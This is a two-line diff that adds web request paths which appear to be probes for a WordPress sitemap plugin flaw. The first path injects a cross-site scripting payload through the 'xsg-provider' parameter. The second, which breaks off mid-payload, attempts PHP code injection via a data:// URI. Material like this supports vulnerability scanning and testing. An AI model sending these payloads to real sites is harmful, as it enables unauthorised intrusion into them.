@@ -1,0 +1,2 @@
+/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp
+/?p=1&xsg-provider=data://text/html,<?php%20echo%20md5(
